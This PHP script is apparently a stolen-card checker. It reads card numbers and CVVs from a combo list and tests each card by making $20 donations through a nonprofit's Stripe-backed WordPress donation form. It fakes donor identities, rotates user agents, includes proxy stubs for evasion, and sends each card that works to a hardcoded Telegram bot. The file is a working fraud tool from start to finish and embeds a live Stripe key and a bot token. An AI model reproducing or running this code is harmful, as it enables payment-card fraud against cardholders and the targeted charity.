<?php
error_reporting(0);
function payment($card,$ccNo,$month,$year,$cvv){

    $length = strlen($year);
    if($length == 2){
    	if($year < 24){
	    	return [
	    		false,
	    		"$card - Expired Card \n"
	    	];
	    }
    }else{
    	if($year < 2024 ){
	    	return [
	    		false,
	    		"$card - Expired Card \n"
	    	];
	    }
    }
	$data = array(
    'type' => 'card',
    'card' => array(
        'number' => $ccNo,
        'cvc' => $cvv,
        'exp_month' => $month,
        'exp_year' => $year
    ),
    'guid' => 'NA',
    'muid' => 'NA',
    'sid' => 'NA',
    'pasted_fields' => 'number',
    'payment_user_agent' => 'stripe.js/93fe8dba76;+stripe-js-v3/93fe8dba76;+card-element',
    'referrer' => 'https://www.eastsideparkwayscoalition.com/',
    'time_on_page' => 200441,
    'key' => 'pk_live_51Or9GoHTj0GS6BMFF5n0J6RWTywSnKihJGHNqEgDCtja4t6Cgk5NWedhYEpjYDHhvvuB8ortgOAb6Q1pVq9a4gXh00ONrrOsHF'
	);
	$url = "https://api.stripe.com/v1/payment_methods";

	$ch = curl_init();

	// Set cURL options
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	// curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
	// curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
	// curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
	$response = curl_exec($ch);
	if (curl_errno($ch)) {
		die("cURL Error: " . curl_error($ch));
	    return [
    		false,
    		"$card - Request Error On Payment \n"
    	];
	}

	curl_close($ch);
	$data = json_decode($response,true);
	if(isset($data['id']) ){
		$paymentId = $data['id'];
		return [
			true,
			$paymentId
		];
	}else{
		$paymentId = $data['id'];
		return [
			false,
			"$card - Invalid Payment ID \n"
		];
	}	
}
function donate($card,$paymentId,$name,$email){
	$formData = "data=__fluent_form_embded_post_id%3D1306%26_fluentform_9_fluentformnonce%3D0c34caea96%26_wp_http_referer%3D%252Fdonate-to-espc%252F%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26email%3D$email%26address_1%255Baddress_line_1%255D%3D125%2520Klee%2520Lane%26address_1%255Baddress_line_2%255D%3D%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bstate%255D%3DNY%26address_1%255Bzip%255D%3D10080%26payment_input%3D%252420%26payment_method%3Dstripe%26checkbox%255B%255D%3D%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=9";
	$userAgents = [
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0',
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
	];

	$randomUserAgent = $userAgents[array_rand($userAgents)];
	//add your proxy here
	// $username = "";
	// $password = "";
	// $PROXYSCRAPE_PORT = ;
	// $PROXYSCRAPE_HOSTNAME = '';
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.eastsideparkwayscoalition.com/wp-admin/admin-ajax.php?t=1721825471378');
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $formData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	    'Referer: https://intercleft.com/donate/',
	    'User-Agent: ' . $randomUserAgent,
	    'X-Requested-With: XMLHttpRequest'
	));
	// curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
	// curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
	// curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
	$response = curl_exec($ch);
	if (curl_errno($ch)) {
	    return [
    		false,
    		"$card -Proxy Error \n"
    	];
	} else {
	    $data = json_decode($response,true);
	    if(isset($data['errors'])){
	    	if(isset($data['errors']) && strpos($data['errors'], "insufficient funds") === 0){
		    	sendTele("$card - Insufficient Funds 20$");
		    	return [
		    		true,
		    		"$card - Insufficient Funds 20$ \n"
		    	];
		    }else{
		    	$errors = $data['errors'];
		    	return [
		    		false,
		    		"$card - $errors \n"
		    	];
		    }
	    }elseif(isset($data['success'])){
	    	if(strpos($data['data']['message'],"Verifying strong customer authentication. Please wait...") === 0){
	    		sendTele("$card - CVV LIVE 20$ (Request 3D Secure)");
	    		return [
	    		true,
	    		"$card - CVV LIVE 20$ (Request 3D Secure) \n"
	    	];
	    	}else{
	    		sendTele("$card - Approved 20$");
	    		return [
	    		true,
	    		"$card - Approved 20$ \n"
	    	];
	    	}
	    }
	}
	curl_close($ch);

}
function random(){
	$apiUrl = 'https://randomuser.me/api/?nat=us';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
    	return [
    		false,
    		"Request Error On Random Generation \n"
    	];
    }
    curl_close($ch);
    $data = json_decode($response);
    if ($data && isset($data->results[0])) {
    	$result = $data->results[0];
        $firstName = $result->name->first;
        $email = $result->email;
        $emailDomains = ["@gmail.com", "@outlook.com", "@hotmail.com"];
        $randomDomain = $emailDomains[array_rand($emailDomains)];
        $modifiedEmail = preg_replace('/@.+$/', $randomDomain, $email);
        return [
        	true,
        	$firstName,
        	$modifiedEmail
        ];
    } else {
    	return [
    		false,
    		"Random generation Error \n"
    	];
    }
}
function sendTele($message){
	$url = $GLOBALS['endpoint'] . "/sendMessage?chat_id=1668286923&text=" . urlencode($message);
    file_get_contents($url);
}

$file = "combo.txt";
$cardList = file_get_contents($file);
if ($cardList === false) {
    die("Error: Unable to read card list file. \n");
}
$botToken = "7201459757:AAE7CCAlBLCQ1ouzRva6tNBf3w2WMxoLXT8"; //don't modify here anything and don't do anything as it is public data
$endpoint = "https://api.telegram.org/bot".$botToken;
$cards = array_map('trim',explode("\n", $cardList));
foreach ($cards as $card) {
	$ecard = array_map('trim', explode("|", $card));
    $ccNo = $ecard[0];
    $month = $ecard[1];
    $year = $ecard[2];
    $cvv = $ecard[3];
	$paymentDetils = payment($card,$ccNo,$month,$year,$cvv);
	$randominfo = random();
	if($paymentDetils[0] !== false){
		if($randominfo[0] !== false){
			$name = $randominfo[1];
	        $email = $randominfo[2];
	        $paymentId = $paymentDetils[1];
	        $donateResult = donate($card,$paymentId,$name,$email);
	        if($donateResult[0] !== false){
	        	echo $donateResult[1];
	        }else{
	            echo $donateResult[1];
	        }
	    }else{
	        echo $randominfo[1];
	    }
	}else{
	    echo $paymentDetils[1];
	}
	sleep(6);
}

?>
